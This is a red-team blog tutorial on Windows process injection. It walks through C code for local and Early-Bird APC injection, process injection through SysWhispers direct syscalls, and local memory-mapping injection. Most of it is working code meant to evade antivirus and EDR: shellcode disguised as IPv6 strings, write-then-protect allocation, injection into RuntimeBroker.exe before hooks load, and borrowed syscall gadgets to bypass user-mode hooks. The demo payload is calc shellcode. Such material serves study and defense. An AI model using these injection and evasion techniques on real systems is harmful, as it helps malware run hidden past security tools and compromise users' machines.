---
title: "Living Inside Another Process: The Art of Injection"
date: 2025-08-05 15:07:00 +0000
categories: [Red Team, Injection]
tags: [process, windows-internals, malware-analysis,malware-dev]
description: "A common way used by ethical hackers in red team engagements and by hacker when creating malware is hiding there processes inside a legitimate process. In this blog we will discuss the art of injecting malicious process in a trusted legit process , so we can evade static detection and reduce noise"
---

>  hi i am  zane bilal , a computer science student and an adventurer in the offensive side of cybersecurity.\
**Before we begin:** All code discussed in this blog is available in my GitHub repo:  
> [https://github.com/Zanebilal/APC-Injection-Techniques](https://github.com/Zanebilal/APC-Injection-Techniques)
> [https://github.com/Zanebilal/ProcessInjectionTechniques](https://github.com/Zanebilal/ProcessInjectionTechniques)


---
> **Disclaimer:** This is for educational and research purposes only. Do not use any of this for unauthorized access or malicious activity.
---
 
---
> As many low level concepts, the first thing you need to do is understand the theory part behind the topic your toggling on, and in our theory part for this topic is to discuss the why and the how we care about injecting process into another processes.\
Injection means adding new thing to another thing so they will become one thing , and in concept of processes , injecting a process_B to a process_A makes the process_B the child process of process_A ( or in other words: process_A is the parent process of the process_B ), and today we will discuss three techniques  : 

        1. APC Injection ( Local & Early-Bird APC )
        2. Process Injection Using SysWhispers
        3. Local Memory Mapping Injection   
---

 >_I know it will be a big writeup and it worth investing the time , cause of i broke-down each technique with deep explanation . and i hope it will help you to get what you need from it, happy reading_
---

# PART 01: APC INJECTION 

## What Is APC Injection?

APC stands for **Asynchronous Procedure Call**. Every thread in Windows has its own APC queue — a list of functions scheduled to run the next time that thread enters an **alertable state**. A thread enters an alertable state when it calls certain wait functions like `SleepEx`, `WaitForSingleObjectEx`, or `WaitForMultipleObjectsEx` with the alertable flag set to `TRUE`.

Instead of creating a new remote thread (which is noisy and easy to detect), APC injection queues the shellcode on an existing or newly created thread. When the thread goes alertable, Windows drains the queue and the payload executes.

**MITRE ATT&CK:** [T1055.004 — Process Injection: Asynchronous Procedure Call](https://attack.mitre.org/techniques/T1055/004/)

This repo has two implementations:

| Technique | Target | Execution Trigger |
|---|---|---|
| Local APC Injection | Current process | Self-created alertable thread via `SleepEx` |
| Early-Bird APC Injection | Remote process (RuntimeBroker.exe) | `DEBUG_PROCESS` launch + `DebugActiveProcessStop` |

---

## Shared Logic: IPv6 Shellcode Obfuscation

Both techniques use the same deobfuscation method, so I will cover it once here before getting into each technique.

The calc.exe shellcode is stored as an array of fake IPv6 address strings instead of raw bytes:

```c
char* Ipv6Array[] = {
    "FC48:83E4:F0E8:C000:0000:4151:4150:5251",
    "5648:31D2:6548:8B52:6048:8B52:1848:8B52",
    // ... 17 strings total
};
```

Each string encodes exactly 16 bytes of shellcode when parsed as an IPv6 address. This keeps the raw shellcode bytes out of the binary, which lowers static detection rates since scanners do not see recognisable shellcode patterns.

To decode them, the code uses `RtlIpv6StringToAddressA` — an undocumented `ntdll.dll` function that converts an IPv6 string into its 16-byte binary representation.

### `Ipv6Deobfuscation()` walkthrough

```c
BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements,
                        OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize)
```

**Step 1 — Resolve `RtlIpv6StringToAddressA` at runtime**

The function has no import library, so it is resolved manually:

```c
fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA =
    (fnRtlIpv6StringToAddressA)GetProcAddress(
        GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
```

The function pointer type is defined with a typedef beforehand:

```c
typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR S, PCSTR* Terminator, PVOID Addr);
```

**Step 2 — Allocate the output buffer**

```c
sBuffSize = NmbrOfElements * 16;   // 17 × 16 = 272 bytes
pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
```

Each IPv6 string decodes to exactly 16 bytes, so the total buffer size is `number_of_elements × 16`.

**Step 3 — Decode each string into the buffer**

```c
TmpBuffer = pBuffer;

for (int i = 0; i < NmbrOfElements; i++) {
    pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer);
    TmpBuffer = (PBYTE)(TmpBuffer + 16);
}

*ppDAddress = pBuffer;
*pDSize = sBuffSize;
```

Each call writes 16 decoded bytes at `TmpBuffer`. The pointer advances by 16 to prepare for the next chunk. After the loop, `pBuffer` holds the complete shellcode and is returned through the output parameters.

---

## Technique 1 — Local APC Injection (`APC_injection.c`)

### Goal

Inject a shellcode payload into the **current process** by queueing it as an APC on a locally created alertable thread.

### Steps

```
[1] Create a thread that immediately enters alertable state  →  CreateThread(AlertableFunction)
[2] Decode the IPv6-obfuscated shellcode                    →  Ipv6Deobfuscation()
[3] Allocate RW memory for the shellcode                    →  VirtualAlloc()
[4] Copy the shellcode into that memory                     →  memcpy()
[5] Flip memory permissions to RWX                         →  VirtualProtect()
[6] Queue the shellcode as APC on the alertable thread      →  QueueUserAPC()
    → Thread wakes from SleepEx, drains APC queue, payload runs
```

### APIs and Functions Used

| Function | Purpose |
|---|---|
| `GetModuleHandle` | Gets the base address of NTDLL for resolving `RtlIpv6StringToAddressA` |
| `GetProcAddress` | Resolves `RtlIpv6StringToAddressA` by name at runtime |
| `HeapAlloc` | Allocates the buffer that will hold the decoded shellcode |
| `RtlIpv6StringToAddressA` | Converts each IPv6 string into 16 raw shellcode bytes |
| `CreateThread` | Creates the local thread that runs `AlertableFunction` |
| `SleepEx` | Puts the thread into an alertable state (called inside `AlertableFunction`) |
| `VirtualAlloc` | Allocates RW memory for the shellcode in the current process |
| `memcpy` | Copies the decoded shellcode into the allocated region |
| `VirtualProtect` | Flips the region's protection from RW to RWX |
| `QueueUserAPC` | Schedules the shellcode to execute on the target thread's APC queue |

### Code Walkthrough

#### `AlertableFunction` — making the thread alertable

```c
void AlertableFunction() {
    SleepEx(INFINITE, TRUE);
}
```

This thread's only job is to sit in an alertable state. `SleepEx` with `bAlertable = TRUE` means: sleep indefinitely, but wake up when an APC arrives. As soon as `QueueUserAPC` is called from the main thread, the OS interrupts this sleep and executes the queued function.

#### `RunViaAPCInjectionFunction` — allocate, write, queue

```c
BOOL RunViaAPCInjectionFunction(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID pPayloadAddress = NULL;
    DWORD dwOldProtection = NULL;

    pPayloadAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Memory is allocated as **read/write only** first. Allocating as RWX directly is a stronger EDR telemetry signal, so the write-then-protect pattern is used instead.

```c
    memcpy(pPayloadAddress, pPayload, sPayloadSize);
```

The decoded shellcode is copied into the newly allocated region.

```c
    VirtualProtect(pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
```

Permissions are flipped to RWX after writing. `dwOldProtection` receives the old value (PAGE_READWRITE) but is not used further.

```c
    QueueUserAPC((PAPCFUNC)pPayloadAddress, hThread, NULL);
```

The shellcode address is cast to `PAPCFUNC` (the required type for APC routines) and queued on the alertable thread. The third argument is a `ULONG_PTR` parameter passed to the APC function — `NULL` here since the shellcode does not need one.

#### `main` — order matters

```c
int main() {
    HANDLE hThread = NULL;
    PBYTE pDeobfuscatedPayload = NULL;
    SIZE_T sDeobfuscatedSize = NULL;

    // Thread is created FIRST so it is already in SleepEx when QueueUserAPC is called
    hThread = CreateThread(NULL, NULL, &AlertableFunction, NULL, NULL, NULL);

    // Decode the shellcode
    Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize);

    // Allocate, copy, protect, and queue
    RunViaAPCInjectionFunction(hThread, pDeobfuscatedPayload, sDeobfuscatedSize);

    return 0;
}
```

The alertable thread is created before the deobfuscation step, so it is already blocking inside `SleepEx` by the time `QueueUserAPC` is called. This guarantees the APC is picked up on the very next OS scheduler pass.

---

## Technique 2 — Early-Bird APC Injection (`EarlyBird.c`)

### Goal

Inject shellcode into **RuntimeBroker.exe** before the process finishes loading. The APC fires during the thread's earliest initialization stage — before AV/EDR products have had a chance to install their hooks inside the new process.

### Why "Early-Bird"?

When a new process starts, before `WinMain` is ever reached, the Windows loader (`ntdll!LdrInitializeThunk`) calls `NtTestAlert` internally to drain the thread's APC queue. If our APC is already in the queue at that moment, the shellcode runs before the process entry point — and before AV/EDR hooks placed in `kernel32` or higher-level DLLs can intercept execution. This is the whole point of the technique.

### Steps

```
[1] Read WINDIR, build the full path to RuntimeBroker.exe   →  GetEnvironmentVariableA + sprintf
[2] Launch it under debugger control                         →  CreateProcessA(DEBUG_PROCESS)
[3] Decode the shellcode from IPv6 strings                   →  Ipv6Deobfuscation()
[4] Allocate RW memory in the remote process                 →  VirtualAllocEx()
[5] Write shellcode into that memory                         →  WriteProcessMemory()
[6] Flip remote memory permissions to RWX                    →  VirtualProtectEx()
[7] Queue the shellcode on the target's main thread          →  QueueUserAPC()
[8] Detach the debugger — process resumes, APC fires         →  DebugActiveProcessStop()
[9] Release handles                                          →  CloseHandle()
```

### APIs and Functions Used

| Function | Purpose |
|---|---|
| `GetEnvironmentVariableA` | Reads `WINDIR` to build the full path to the target binary |
| `RtlSecureZeroMemory` | Zero-initializes `STARTUPINFO` and `PROCESS_INFORMATION` before use |
| `CreateProcessA` | Launches RuntimeBroker.exe with the `DEBUG_PROCESS` flag |
| `GetProcAddress` / `GetModuleHandle` | Resolves `RtlIpv6StringToAddressA` for the deobfuscation step |
| `HeapAlloc` | Allocates the deobfuscation output buffer |
| `RtlIpv6StringToAddressA` | Decodes each IPv6 string into 16 shellcode bytes |
| `VirtualAllocEx` | Allocates memory inside the remote (target) process |
| `WriteProcessMemory` | Copies shellcode from our process into the remote allocation |
| `VirtualProtectEx` | Changes the remote region's protection to RWX |
| `QueueUserAPC` | Queues the shellcode address on the remote process's main thread |
| `DebugActiveProcessStop` | Detaches the debugger, letting the target process resume |
| `CloseHandle` | Releases the process and thread handles |

### Code Walkthrough

#### `CreateDebugedProcess` — launch target and get handles

```c
BOOL CreateDebugedProcess(LPCSTR lpProcessName, DWORD* dwProcessId,
                           HANDLE* hProcess, HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
    Si.cb = sizeof(STARTUPINFO);

    GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH);
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
```

`GetEnvironmentVariableA("WINDIR")` reads the Windows directory (typically `C:\Windows`). The target path is built dynamically so the code works on any Windows install without hardcoding.

`RtlSecureZeroMemory` is used instead of plain `memset` because the compiler is not allowed to optimize it away — it is guaranteed to zero memory even in release builds.

```c
    CreateProcessA(
        NULL,
        lpPath,
        NULL, NULL, FALSE,
        DEBUG_PROCESS,   // we become the debugger of this process
        NULL, NULL,
        &Si, &Pi
    );

    *dwProcessId = Pi.dwProcessId;
    *hProcess    = Pi.hProcess;
    *hThread     = Pi.hThread;   // main thread handle — passed to QueueUserAPC later
```

`DEBUG_PROCESS` makes the calling process the debugger of the newly created one. All threads in the target are kept suspended until we either send a `ContinueDebugEvent` or detach. `PROCESS_INFORMATION` gives us back the process handle and the **main thread handle**, which is what we need for `QueueUserAPC`.

#### `InjectShellcodeToRemoteProcess` — write shellcode into the target

```c
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode,
                                     SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

`VirtualAllocEx` is the cross-process version of `VirtualAlloc`. It takes a process handle and allocates memory in that process's address space. Starting with `PAGE_READWRITE` again.

```c
    WriteProcessMemory(hProcess, *ppAddress, pShellcode,
                       sSizeOfShellcode, &sNumberOfBytesWritten);
```

The shellcode is written from our process into the remote allocation. `sNumberOfBytesWritten` is checked against the expected size to confirm the full payload was written.

```c
    VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode,
                     PAGE_EXECUTE_READWRITE, &dwOldProtection);
```

Permissions flipped to RWX. The region inside the target process is now executable.

#### `main` — queue and release

```c
int main() {
    // [1] Launch RuntimeBroker.exe under debug control, get its handles
    CreateDebugedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread);

    // [2] Decode the IPv6-obfuscated shellcode
    Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sPayloadSize);

    // [3] Allocate + write + protect inside the target process
    InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload,
                                   sPayloadSize, &pPayloadAddress);

    // [4] Queue the shellcode on the target's main thread
    QueueUserAPC((PTHREAD_START_ROUTINE)pPayloadAddress, hThread, NULL);

    // [5] Detach — process resumes, NtTestAlert drains the queue,
    //     shellcode fires before the entry point
    DebugActiveProcessStop(dwProcessId);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
```

`DebugActiveProcessStop` detaches without killing the target. Once it returns, the OS resumes the target's threads. The main thread was paused inside `LdrInitializeThunk`, and since the APC is already queued, `NtTestAlert` drains it and runs the shellcode before `WinMain` is ever reached.

---

## References

- [Microsoft Docs — QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [MITRE ATT&CK T1055.004](https://attack.mitre.org/techniques/T1055/004/)
- [MalDev Academy](https://maldevacademy.com/)
- *Malware Development for Ethical Hackers* — Packt Publishing
- [Source code — APC-Injection-Techniques](https://github.com/Zanebilal/APC-Injection-Techniques)


# PART 02: Process Injection Using SysWhispers

### The Problem: User-Mode Hooks

EDRs protect systems by patching the first few bytes of sensitive functions inside `ntdll.dll`. When your code calls `NtAllocateVirtualMemory`, for example, the EDR has replaced those bytes with a `JMP` instruction that redirects execution into the EDR's own monitoring code before the real syscall happens.

```
Normal flow:
  Your code → ntdll.dll (hooked) → EDR handler → (maybe) syscall → kernel

SysWhispers flow:
  Your code → SysWhispers stub (raw syscall opcode) → kernel
```

SysWhispers solves this by resolving the correct **System Call Number (SSN)** at runtime and issuing the `syscall` instruction directly — without going through the potentially hooked `ntdll.dll` function at all.

### How SysWhispers Works — `SysWhispers.c` / `SysWhispers.h`

The SysWhispers implementation here is adapted from `@modexpblog`'s work on direct syscall invocation. It has three main pieces: the PEB walk to find ntdll, the hash-based function lookup, and the "Jumper" to find a clean `syscall` gadget.

#### Step 1 — Walk the PEB to find `ntdll.dll`

`SW3_PopulateSyscallList()` is called before any syscall. It locates `ntdll.dll` in memory by walking the **Process Environment Block (PEB)**, which Windows keeps up to date for every running process.

```c
#ifdef _WIN64
PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
#else
PSW3_PEB Peb = (PSW3_PEB)__readfsdword(0x30);
#endif
PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
```

On 64-bit Windows, `gs:[0x60]` always points to the PEB of the current process. From there, `Peb->Ldr` gives the loader data structure, which contains a doubly-linked list of all loaded modules.

The code iterates that list and identifies `ntdll.dll` by checking the first 8 characters of the DLL name:

```c
if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;  // "ntdl"
if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break; // "l.dl"
```

The `| 0x20202020` mask converts ASCII to lowercase before comparing, so it matches both `ntdll.dll` and `NTDLL.DLL`.

#### Step 2 — Parse the Export Address Table and collect `Zw*` entries

Once `ntdll.dll`'s base address is found, the code parses its PE Export Directory to enumerate all exported function names:

```c
DWORD NumberOfNames = ExportDirectory->NumberOfNames;
PDWORD Functions   = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
PDWORD Names       = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
PWORD  Ordinals    = SW3_RVA2VA(PWORD,  DllBase, ExportDirectory->AddressOfNameOrdinals);
```

Only `Zw*` functions are collected — these are the native syscall stubs in ntdll. They are identified by checking the first two bytes of the function name:

```c
if (*(USHORT*)FunctionName == 0x775a)   // 'Z' = 0x5A, 'w' = 0x77
```

For each matching function, the hash, address, and (in JUMPER mode) the syscall gadget address are saved into `SW3_SyscallList`.

#### Step 3 — Sort by address to determine SSNs

After collecting all `Zw*` entries, they are sorted by address in ascending order using bubble sort:

```c
for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
    for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
        if (Entries[j].Address > Entries[j + 1].Address)
            // swap Entries[j] and Entries[j+1]
```

This is important because Windows assigns SSNs in the order the `Zw*` functions appear in memory. After sorting, the **index of a function in the list equals its SSN**. This is how `SW3_GetSyscallNumber` works:

```c
EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash) {
    if (!SW3_PopulateSyscallList()) return -1;
    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
            return i;   // index = SSN
    return -1;
}
```

#### Step 4 — JUMPER: find a clean `syscall; ret` gadget

This is the part that handles hooked functions. When `ntdll.dll` is hooked, the first bytes of the function are overwritten with a `JMP`. The `syscall; ret` bytes that were originally there are gone.

`SC_Address()` looks for the `syscall; ret` byte sequence (`0x0F 0x05 0xC3`) at the expected offset from the function's start:

```c
BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };  // syscall; ret
ULONG distance_to_syscall = 0x12;             // fixed offset on x64

SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);

if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
    return SyscallAddress;   // found clean gadget in the original function
```

If the bytes are not there (because the function is hooked), it searches neighboring `Nt*` functions — walking forward and backward in 0x20-byte increments (the typical stub size) until it finds an unhooked neighbor with intact `syscall; ret` bytes:

```c
for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++) {
    // check below
    SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress,
                                distance_to_syscall + num_jumps * 0x20);
    if (!memcmp(syscall_code, SyscallAddress, 3)) return SyscallAddress;

    // check above
    SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress,
                                distance_to_syscall - num_jumps * 0x20);
    if (!memcmp(syscall_code, SyscallAddress, 3)) return SyscallAddress;
}
```

This technique is similar to **HalosGate** — borrowing a clean `syscall` gadget from an adjacent, unhooked function.

#### Hash Function

Function lookup is done by hash rather than by comparing strings. `SW3_HashSyscall` computes a rolling hash by reading the function name two bytes at a time and XOR-ing with a right-rotate of the current hash value:

```c
#define SW3_SEED 0x4552AC07
#define SW3_ROR8(v) (v >> 8 | v << 24)

DWORD SW3_HashSyscall(PCSTR FunctionName) {
    DWORD i = 0;
    DWORD Hash = SW3_SEED;
    while (FunctionName[i]) {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + SW3_ROR8(Hash);
    }
    return Hash;
}
```

The hash for each target function is pre-computed and baked into the generated assembly stubs. At runtime, no string comparison ever happens — just an integer lookup.

---

### `main.c` — Using SysWhispers for Injection

The actual injection logic is in `ProcessInjectionViaSyscalls()`, which works for both local and remote targets depending on what process handle is passed in.

#### Compile-time switch: local vs remote

```c
#define LOCAL_INJECTION

#ifndef LOCAL_INJECTION
#define REMOTE_INJECTION
#define PROCESS_ID 3120
#endif
```

`LOCAL_INJECTION` is defined by default. Removing that `#define` and uncommenting `REMOTE_INJECTION` switches the target to a remote process with PID 3120.

#### Steps

```
[1] Open target (local: pseudo handle -1, remote: OpenProcess)
[2] Allocate RW memory in the target                    →  NtAllocateVirtualMemory()
[3] Write shellcode into that memory                    →  NtWriteVirtualMemory()
[4] Flip permissions to RWX                             →  NtProtectVirtualMemory()
[5] Create a thread at the shellcode address            →  NtCreateThreadEx()
```

#### APIs and Functions Used

| Function | Layer | Purpose |
|---|---|---|
| `OpenProcess` | Win32 | Opens the remote target process (remote injection mode only) |
| `NtAllocateVirtualMemory` | NT syscall (SysWhispers) | Allocates memory in the target process |
| `NtWriteVirtualMemory` | NT syscall (SysWhispers) | Writes the shellcode into the allocated region |
| `NtProtectVirtualMemory` | NT syscall (SysWhispers) | Changes memory protection from RW to RWX |
| `NtCreateThreadEx` | NT syscall (SysWhispers) | Creates a thread in the target pointing at the shellcode |

The four NT functions are declared in `SysWhispers.h` as `EXTERN_C` with the standard NT signatures, and their implementations are generated assembly stubs that issue the `syscall` instruction directly.

#### `ProcessInjectionViaSyscalls` walkthrough

```c
BOOL ProcessInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    NTSTATUS STATUS             = 0x00;
    PVOID    pAddress           = NULL;
    ULONG    uOldProtection     = NULL;
    SIZE_T   sSize              = sPayloadSize,
             sNumberOfBytesWritten = NULL;
    HANDLE   hThread            = NULL;
```

**Allocate memory (RW):**

```c
    STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize,
                                     MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
```

`hProcess` can be `(HANDLE)-1` for the current process (the Windows pseudo-handle, equivalent to `GetCurrentProcess()`). The function allocates `sSize` bytes of RW memory and stores the base address in `pAddress`.

**Write shellcode:**

```c
    STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload,
                                  sPayloadSize, &sNumberOfBytesWritten);
```

`NtWriteVirtualMemory` is the direct syscall equivalent of `WriteProcessMemory`. The written byte count is checked against `sPayloadSize` to confirm success.

**Flip to RWX:**

```c
    STATUS = NtProtectVirtualMemory(hProcess, &pAddress, &sPayloadSize,
                                    PAGE_EXECUTE_READWRITE, &uOldProtection);
```

The region is made executable after writing. `uOldProtection` gets the previous value (PAGE_READWRITE).

**Create thread:**

```c
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                              pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
```

`NtCreateThreadEx` is the NT-layer equivalent of `CreateRemoteThread`. EDRs routinely hook `CreateRemoteThread` in `kernel32.dll` — calling `NtCreateThreadEx` through a SysWhispers stub bypasses that hook entirely.

#### `main` — local vs remote paths

```c
int main() {

#ifdef LOCAL_INJECTION
    // (HANDLE)-1 is the pseudo-handle for the current process
    if (!ProcessInjectionViaSyscalls((HANDLE)-1, Payload, sizeof(Payload)))
        return -1;
#endif

#ifdef REMOTE_INJECTION
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
    if (hProcess == NULL) { /* error */ return -1; }
    if (!ProcessInjectionViaSyscalls(hProcess, Payload, sizeof(Payload)))
        return -1;
#endif

    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}
```

For local injection, passing `(HANDLE)-1` to `NtAllocateVirtualMemory` and the other NT functions tells the kernel to operate on the calling process — no need to open a separate handle.

For remote injection, `OpenProcess` is a Win32 call (not syscalled through SysWhispers). Only the sensitive injection primitives go through the syscall layer; `OpenProcess` by itself does not carry the same detection weight.

---

# PART 03 : Local Memory Mapping Injection

### Concept

Traditional injection writes shellcode into a target's memory using `VirtualAllocEx` + `WriteProcessMemory`. Both of those calls are heavily monitored. Memory mapping injection avoids `WriteProcessMemory` entirely by creating a **file-mapped section** — a region of memory backed by the Windows paging file rather than a disk file — and copying the shellcode into a mapped view of that section.

This implementation is **local-only**: the shellcode is mapped and executed in the same process. The region appears in the process's memory as `MEM_MAPPED` (a memory-mapped section) rather than `MEM_PRIVATE` (a standard heap/virtual allocation), which is a different memory characteristic that some scanning tools do not flag as aggressively.

### Steps

```
[1] Create an anonymous section backed by the paging file  →  CreateFileMappingW()
[2] Map a writable+executable view into the current process →  MapViewOfFile()
[3] Copy the shellcode into the mapped view                →  memcpy()
[4] Close the section handle                               →  CloseHandle()
[5] Create a thread at the mapped address                  →  CreateThread()
[6] Wait for the thread to finish                          →  WaitForSingleObject()
```

### APIs and Functions Used

| Function | Purpose |
|---|---|
| `CreateFileMappingW` | Creates an anonymous section object backed by the paging file |
| `MapViewOfFile` | Maps a view of the section into the current process with execute + write access |
| `memcpy` | Copies the shellcode payload into the mapped view |
| `CloseHandle` | Closes the section object handle (the mapped view remains valid) |
| `CreateThread` | Creates a thread that starts executing at the base of the mapped view |
| `WaitForSingleObject` | Blocks the main thread until the shellcode thread finishes |

### Code Walkthrough

#### `LocalMappingInjection` — create, map, write

```c
BOOL LocalMappingInjection(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* pPayloadAddress) {

    HANDLE hFileObject   = NULL;
    BOOL   bSTATE        = TRUE;
    PVOID  pMappedAddress = NULL;
```

**Create the section:**

```c
    hFileObject = CreateFileMappingW(
        INVALID_HANDLE_VALUE,   // no disk file — backed by paging file
        NULL,                   // default security
        PAGE_EXECUTE_READWRITE, // maximum protection the section allows
        NULL,                   // high DWORD of size (0 = use low DWORD)
        sPayloadSize,           // size of the section
        NULL                    // anonymous — no name
    );
```

`INVALID_HANDLE_VALUE` as the first argument tells Windows to create a section backed by the paging file rather than a real file on disk. `PAGE_EXECUTE_READWRITE` sets the maximum protection any mapped view of this section can have.

**Map a view:**

```c
    pMappedAddress = MapViewOfFile(
        hFileObject,
        FILE_MAP_EXECUTE | FILE_MAP_WRITE,  // view access: execute + write
        NULL,                               // file offset high
        NULL,                               // file offset low
        sPayloadSize                        // number of bytes to map
    );
```

`MapViewOfFile` with `FILE_MAP_EXECUTE | FILE_MAP_WRITE` gives a view of the section that is both writable and executable. The returned address (`pMappedAddress`) points to the mapped region in the current process's address space.

**Copy the shellcode in:**

```c
    memcpy(pMappedAddress, pPayload, sPayloadSize);
```

The shellcode is written directly into the mapped view. Since the section is backed by the paging file, these bytes are now in a shared physical memory page — but for local injection, there is no second process mapping the same section.

**Close the section handle and return the address:**

```c
_EndOfFunction:
    *pPayloadAddress = pMappedAddress;
    if (hFileObject)
        CloseHandle(hFileObject);
    return bSTATE;
}
```

The section handle (`hFileObject`) is closed here, but the **mapped view** (`pMappedAddress`) remains valid. Closing the section handle just means we can no longer create new views of that section — existing views are reference-counted separately by the kernel and stay alive until explicitly unmapped or the process exits.

The `goto _EndOfFunction` pattern is used for cleanup: both the success and failure paths jump there to ensure `hFileObject` is always closed and the address pointer is always written.

#### `main` — run the shellcode

```c
int main() {
    PVOID  pAddress = NULL;
    HANDLE hThread  = NULL;

    // Map the shellcode into a file-backed region
    if (!LocalMappingInjection(Payload, sizeof(Payload), &pAddress))
        return -1;

    // Create a thread at the mapped address
    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress,
                           NULL, NULL, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
    }

    return 0;
}
```

`pAddress` is the base address of the mapped view. It is cast to `LPTHREAD_START_ROUTINE` and passed directly to `CreateThread`. The main thread then blocks on `WaitForSingleObject` until the shellcode thread exits.

---

## References

- [SysWhispers — jthuraisamy](https://github.com/jthuraisamy/SysWhispers)
- [Bypassing User-Mode Hooks — @modexpblog / MDSec](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)
- [Microsoft Docs — CreateFileMapping](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga)
- [Microsoft Docs — MapViewOfFile](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)
- [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/)
- [MalDev Academy](https://maldevacademy.com/)
- *Malware Development for Ethical Hackers* — Packt Publishing
- [Source code — ProcessInjectionTechniques](https://github.com/Zanebilal/ProcessInjectionTechniques)

